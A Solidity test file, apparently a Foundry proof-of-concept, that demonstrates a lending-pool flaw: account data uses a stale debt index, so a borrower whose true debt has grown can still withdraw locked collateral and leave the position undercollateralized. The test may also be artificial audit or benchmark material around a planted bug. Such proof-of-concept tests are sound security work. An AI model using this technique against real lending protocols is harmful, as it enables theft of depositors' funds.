// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {ILendingPool} from "src/interfaces/ILendingPool.sol";
import {IPriceOracle} from "src/interfaces/IPriceOracle.sol";
import {Lending} from "src/Lending/Lending.sol";
import {PriceOracle} from "src/PriceOracle.sol";
import {MockERC20} from "src/mocks/MockERC20.sol";
import {BaseTest} from "./helpers/BaseTest.sol";

contract PlantPoC is BaseTest {
    uint256 internal constant USDC_PRICE = 1e8;
    uint256 internal constant WETH_PRICE = 2_000e8;

    MockERC20 internal usdc;
    MockERC20 internal weth;
    PriceOracle internal oracle;
    Lending internal target;

    function setUp() public override {
        super.setUp();

        usdc = deployMockToken("USDC", 6);
        weth = deployMockToken("WETH", 18);

        vm.startPrank(owner);
        oracle = new PriceOracle();
        target = new Lending(IPriceOracle(address(oracle)), 5_000);
        target.listReserve(address(usdc), _defaultIrParams(), 8_000, 8_500, 500, 1_000, true, true);
        target.listReserve(address(weth), _defaultIrParams(), 7_500, 8_000, 500, 1_000, true, true);
        oracle.setPrice(address(usdc), USDC_PRICE);
        oracle.setPrice(address(weth), WETH_PRICE);
        vm.stopPrank();

        mintAndApprove(usdc, alice, address(target), 1_000e6);
        mintAndApprove(weth, bob, address(target), 1 ether);
    }

    function testPoC_staleDebtAccountDataLetsBorrowerWithdrawLockedCollateral() public {
        _supply(alice, usdc, 1_000e6, alice);
        _supply(bob, weth, 1 ether, bob);

        vm.prank(bob);
        target.borrow(address(usdc), 800e6, bob);

        advanceSeconds(5 * 365 days);

        vm.startPrank(owner);
        oracle.setPrice(address(usdc), USDC_PRICE);
        oracle.setPrice(address(weth), WETH_PRICE);
        vm.stopPrank();

        (, uint256 trueDebtBefore) = target.getUserReserveData(bob, address(usdc));
        (, uint256 visibleDebtBefore,, uint256 visibleHealthBefore) = target.getUserAccountData(bob);

        assertGt(trueDebtBefore, 1_500e6, "debt did not accrue enough");
        assertEq(visibleDebtBefore, 800e18, "account data should be using the stale debt index");
        assertGt(visibleHealthBefore, target.MIN_HEALTH_FACTOR(), "stale view should still look healthy");

        uint256 bobWethBefore = weth.balanceOf(bob);

        vm.prank(bob);
        target.withdraw(address(weth), 0.49 ether, bob);

        assertEq(weth.balanceOf(bob) - bobWethBefore, 0.49 ether, "collateral withdrawal failed");

        target.accrueInterest(address(usdc));

        (, uint256 trueDebtAfter) = target.getUserReserveData(bob, address(usdc));
        (uint256 collateralValue, uint256 visibleDebtAfter,, uint256 trueHealthAfter) = target.getUserAccountData(bob);

        assertEq(trueDebtAfter, trueDebtBefore, "accrual should materialize the same simulated debt");
        assertGt(visibleDebtAfter, 1_500e18, "debt should become visible once stored index catches up");
        assertLt(trueHealthAfter, target.MIN_HEALTH_FACTOR(), "position is now undercollateralized");
        assertLt(collateralValue, visibleDebtAfter, "remaining collateral no longer covers visible debt");
    }

    function _defaultIrParams() internal pure returns (ILendingPool.InterestRateParams memory params) {
        params = ILendingPool.InterestRateParams({
            baseRateRayPerYear: 0,
            slope1RayPerYear: 2e26,
            slope2RayPerYear: 8e26,
            optimalUtilizationBps: 8_000
        });
    }

    function _supply(address user, MockERC20 token, uint256 amount, address onBehalfOf) internal {
        vm.prank(user);
        target.supply(address(token), amount, onBehalfOf);
    }
}
